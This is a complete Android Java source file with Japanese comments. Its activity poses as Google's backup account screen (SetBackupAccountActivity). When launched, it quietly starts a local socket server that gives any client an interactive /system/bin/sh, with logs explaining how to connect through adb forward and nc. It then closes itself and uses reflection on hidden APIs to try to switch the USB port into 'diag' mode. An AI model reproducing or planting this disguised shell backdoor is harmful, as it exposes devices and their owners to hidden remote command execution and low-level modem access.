package com.google.android.backup;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import android.net.LocalServerSocket;
import android.net.LocalSocket;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "ShellSocket";
    private static final String SOCKET_NAME = "android_shell_socket";
    private static final String USB_FUNCTION_DIAG = "diag";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // バックグラウンドでソケットサーバーを起動
        startShellServer();

        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
        finish();

        // 既存処理の最後に、USB 機能を diag に切り替える自動処理を実行
        applyAutomaticUsbSwitchToDiag();
    }

    /**
     * USB 機能を diag に切り替える自動処理。
     *
     * <p>複数の Java ベース手段を順に試す。いずれも失敗してもクラッシュしない。
     * Runtime.exec / ProcessBuilder は新規追加部分では使用しない。
     */
    private void applyAutomaticUsbSwitchToDiag() {
        try {
            Context context = getApplicationContext();
            if (context == null) {
                Log.e(TAG, "Context is null, skip USB switch");
                return;
            }

            // 1) UsbManager.setCurrentFunction をリフレクションで呼ぶ
            UsbFunctionSwitcher.setCurrentFunctionViaUsbManager(
                    context, USB_FUNCTION_DIAG, false);

            // 2) IUsbManager を ServiceManager から直接取得して Binder 経由で呼ぶ
            UsbFunctionSwitcher.setCurrentFunctionViaIUsbManager(
                    USB_FUNCTION_DIAG, false);

            // 3) SystemProperties 経由で sys.usb.config を書き換える
            UsbFunctionSwitcher.setUsbConfigViaSystemProperties(USB_FUNCTION_DIAG);

            // 4) 現在の状態を読み取ってログに残す（読み取りのみ）
            UsbFunctionSwitcher.logCurrentUsbState(context);

            Log.i(TAG, "applyAutomaticUsbSwitchToDiag finished");
        } catch (Throwable t) {
            Log.e(TAG, "applyAutomaticUsbSwitchToDiag error", t);
        }
    }

    private void startShellServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Unixドメインソケット（抽象名前空間）を開く
                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");

                    while (true) {
                        try {
                            LocalSocket client = server.accept();
                            Log.i(TAG, "New client connected!");
                            // クライアントごとに新しいシェルスレッドを起動
                            new Thread(new ShellHandler(client)).start();
                        } catch (Exception e) {
                            Log.e(TAG, "Accept error", e);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start socket server", e);
                }
            }
        }).start();
    }

    // クライアント接続ごとにシェルを提供するハンドラ
    private static class ShellHandler implements Runnable {
        private LocalSocket socket;

        ShellHandler(LocalSocket socket) {
            this.socket = socket;
        }

        @Override
        public void run() {
            Process shell = null;
            try {
                // インタラクティブシェルを起動
                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
                builder.redirectErrorStream(true); // stderrをstdoutに統合
                shell = builder.start();

                // ソケットの入出力ストリームを取得
                final InputStream socketIn = socket.getInputStream();
                final OutputStream socketOut = socket.getOutputStream();

                // シェルの入出力ストリームを取得
                final OutputStream shellStdin = shell.getOutputStream();
                final InputStream shellStdout = shell.getInputStream();

                // スレッド1: ソケット → シェル (ユーザー入力 → シェルstdin)
                Thread socketToShell = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = socketIn.read(buffer)) != -1) {
                                shellStdin.write(buffer, 0, len);
                                shellStdin.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                // スレッド2: シェル → ソケット (シェルstdout → クライアント)
                Thread shellToSocket = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = shellStdout.read(buffer)) != -1) {
                                socketOut.write(buffer, 0, len);
                                socketOut.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                socketToShell.start();
                shellToSocket.start();

                // シェルプロセスが終了するのを待つ（またはソケット切断）
                shell.waitFor();
                Log.i(TAG, "Shell process exited");

                // 後始末
                socket.close();
                socketToShell.interrupt();
                shellToSocket.interrupt();

            } catch (Exception e) {
                Log.e(TAG, "Shell handler error", e);
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
                try {
                    socket.close();
                } catch (Exception ignored) {}
            }
        }
    }

    /**
     * USB 機能切替のための Java ベース手段をまとめたヘルパー。
     *
     * <p>すべてリフレクション経由。hidden API を直接参照しないため、
     * 公開 SDK の android.jar でもコンパイル可能。
     *
     * <p>各メソッドは Throwable まで捕捉し、失敗しても呼び出し元に例外を伝播しない。
     */
    private static final class UsbFunctionSwitcher {

        private static final String TAG = "UsbFunctionSwitcher";

        private UsbFunctionSwitcher() {
        }

        /**
         * UsbManager.setCurrentFunction(String, boolean) をリフレクションで呼ぶ。
         */
        static void setCurrentFunctionViaUsbManager(Context context,
                                                    String function,
                                                    boolean makeDefault) {
            try {
                if (context == null) {
                    Log.e(TAG, "context is null (UsbManager)");
                    return;
                }
                Object service = context.getSystemService(Context.USB_SERVICE);
                if (service == null) {
                    Log.e(TAG, "UsbManager is null");
                    return;
                }
                Class<?> cls = service.getClass();
                Method m = cls.getMethod("setCurrentFunction", String.class, boolean.class);
                m.setAccessible(true);
                m.invoke(service, function, makeDefault);
                Log.i(TAG, "UsbManager.setCurrentFunction invoked: " + function
                        + ", makeDefault=" + makeDefault);
            } catch (NoSuchMethodException e) {
                Log.e(TAG, "UsbManager.setCurrentFunction not found", e);
            } catch (SecurityException e) {
                Log.e(TAG, "SecurityException in UsbManager.setCurrentFunction", e);
            } catch (Throwable t) {
                Log.e(TAG, "Throwable in UsbManager.setCurrentFunction", t);
            }
        }

        /**
         * UsbManager.setMassStorageBackingFile(String) をリフレクションで呼ぶ。
         */
        static void setMassStorageBackingFileViaUsbManager(Context context, String path) {
            try {
                if (context == null) {
                    return;
                }
                Object service = context.getSystemService(Context.USB_SERVICE);
                if (service == null) {
                    return;
                }
                Method m = service.getClass().getMethod("setMassStorageBackingFile", String.class);
                m.setAccessible(true);
                m.invoke(service, path);
                Log.i(TAG, "UsbManager.setMassStorageBackingFile invoked: " + path);
            } catch (NoSuchMethodException e) {
                Log.e(TAG, "UsbManager.setMassStorageBackingFile not found", e);
            } catch (Throwable t) {
                Log.e(TAG, "Throwable in UsbManager.setMassStorageBackingFile", t);
            }
        }

        /**
         * ServiceManager から "usb" Binder を取得し、
         * IUsbManager$Stub.asInterface 経由で setCurrentFunction を呼ぶ。
         *
         * <p>UsbManager を経由せず、Binder を直接叩く経路。
         */
        static void setCurrentFunctionViaIUsbManager(String function, boolean makeDefault) {
            try {
                Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
                Method getService = serviceManagerClass.getMethod("getService", String.class);
                getService.setAccessible(true);
                Object binderObj = getService.invoke(null, "usb");
                if (!(binderObj instanceof IBinder)) {
                    Log.e(TAG, "usb service binder is null or not IBinder");
                    return;
                }
                IBinder binder = (IBinder) binderObj;

                Class<?> stubClass = Class.forName("android.hardware.usb.IUsbManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                asInterface.setAccessible(true);
                Object iUsbManager = asInterface.invoke(null, binder);
                if (iUsbManager == null) {
                    Log.e(TAG, "IUsbManager.asInterface returned null");
                    return;
                }

                Method setCurrentFunction =
                        iUsbManager.getClass().getMethod("setCurrentFunction", String.class, boolean.class);
                setCurrentFunction.setAccessible(true);
                setCurrentFunction.invoke(iUsbManager, function, makeDefault);
                Log.i(TAG, "IUsbManager.setCurrentFunction invoked: " + function
                        + ", makeDefault=" + makeDefault);
            } catch (ClassNotFoundException e) {
                Log.e(TAG, "IUsbManager/ServiceManager class not found", e);
            } catch (NoSuchMethodException e) {
                Log.e(TAG, "setCurrentFunction/asInterface not found", e);
            } catch (SecurityException e) {
                Log.e(TAG, "SecurityException in IUsbManager.setCurrentFunction", e);
            } catch (Throwable t) {
                Log.e(TAG, "Throwable in IUsbManager.setCurrentFunction", t);
            }
        }

        /**
         * IUsbManager.hasDevicePermission / hasAccessoryPermission などを
         * リフレクションで呼ぶための汎用ヘルパー。
         *
         * <p>引数なし・引数ありの両方に対応。
         */
        static Object invokeIUsbManager(String methodName,
                                       Class<?>[] paramTypes,
                                       Object[] args) {
            try {
                Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
                Method getService = serviceManagerClass.getMethod("getService", String.class);
                getService.setAccessible(true);
                Object binderObj = getService.invoke(null, "usb");
                if (!(binderObj instanceof IBinder)) {
                    return null;
                }
                IBinder binder = (IBinder) binderObj;

                Class<?> stubClass = Class.forName("android.hardware.usb.IUsbManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                asInterface.setAccessible(true);
                Object iUsbManager = asInterface.invoke(null, binder);
                if (iUsbManager == null) {
                    return null;
                }
                Method m = iUsbManager.getClass().getMethod(methodName, paramTypes);
                m.setAccessible(true);
                return m.invoke(iUsbManager, args);
            } catch (Throwable t) {
                Log.e(TAG, "invokeIUsbManager error: " + methodName, t);
                return null;
            }
        }

        /**
         * SystemProperties.set(String, String) をリフレクションで呼び、
         * sys.usb.config を書き換える。
         *
         * <p>注意: 実際に USB 構成が再評価されるかは init / SELinux /
         * ベンダー実装に依存する。ここでは書き込みを試みるだけ。
         */
        static void setUsbConfigViaSystemProperties(String function) {
            try {
                Class<?> spClass = Class.forName("android.os.SystemProperties");
                Method setMethod = spClass.getMethod("set", String.class, String.class);
                setMethod.setAccessible(true);
                setMethod.invoke(null, "sys.usb.config", function);
                Log.i(TAG, "SystemProperties.set(sys.usb.config, " + function + ") invoked");
            } catch (ClassNotFoundException e) {
                Log.e(TAG, "SystemProperties class not found", e);
            } catch (NoSuchMethodException e) {
                Log.e(TAG, "SystemProperties.set not found", e);
            } catch (SecurityException e) {
                Log.e(TAG, "SecurityException in SystemProperties.set", e);
            } catch (Throwable t) {
                Log.e(TAG, "Throwable in SystemProperties.set", t);
            }
        }

        /**
         * SystemProperties.get(String, String) をリフレクションで読み取る。
         */
        static String getSystemProperty(String key, String defaultValue) {
            try {
                Class<?> spClass = Class.forName("android.os.SystemProperties");
                Method getMethod = spClass.getMethod("get", String.class, String.class);
                getMethod.setAccessible(true);
                Object result = getMethod.invoke(null, key, defaultValue);
                return result instanceof String ? (String) result : defaultValue;
            } catch (Throwable t) {
                Log.e(TAG, "getSystemProperty error: " + key, t);
                return defaultValue;
            }
        }

        /**
         * UsbManager.isFunctionEnabled(String) をリフレクションで呼ぶ。
         */
        static boolean isFunctionEnabledViaUsbManager(Context context, String function) {
            try {
                if (context == null) {
                    return false;
                }
                Object service = context.getSystemService(Context.USB_SERVICE);
                if (service == null) {
                    return false;
                }
                Method m = service.getClass().getMethod("isFunctionEnabled", String.class);
                m.setAccessible(true);
                Object result = m.invoke(service, function);
                return result instanceof Boolean && (Boolean) result;
            } catch (Throwable t) {
                Log.e(TAG, "isFunctionEnabledViaUsbManager error", t);
                return false;
            }
        }

        /**
         * UsbManager.getDefaultFunction() をリフレクションで呼ぶ。
         */
        static String getDefaultFunctionViaUsbManager(Context context) {
            try {
                if (context == null) {
                    return null;
                }
                Object service = context.getSystemService(Context.USB_SERVICE);
                if (service == null) {
                    return null;
                }
                Method m = service.getClass().getMethod("getDefaultFunction");
                m.setAccessible(true);
                Object result = m.invoke(service);
                return result instanceof String ? (String) result : null;
            } catch (Throwable t) {
                Log.e(TAG, "getDefaultFunctionViaUsbManager error", t);
                return null;
            }
        }

        /**
         * 現在の USB 状態を読み取ってログに残す。読み取りのみ。
         */
        static void logCurrentUsbState(Context context) {
            try {
                String sysUsbConfig = getSystemProperty("sys.usb.config", "");
                String persistUsbConfig = getSystemProperty("persist.sys.usb.config", "");
                String defaultFunction = getDefaultFunctionViaUsbManager(context);
                boolean diagEnabled = isFunctionEnabledViaUsbManager(context, USB_FUNCTION_DIAG);

                Log.i(TAG, "sys.usb.config=" + sysUsbConfig);
                Log.i(TAG, "persist.sys.usb.config=" + persistUsbConfig);
                Log.i(TAG, "UsbManager.getDefaultFunction()=" + defaultFunction);
                Log.i(TAG, "UsbManager.isFunctionEnabled(diag)=" + diagEnabled);
            } catch (Throwable t) {
                Log.e(TAG, "logCurrentUsbState error", t);
            }
        }
    }
}
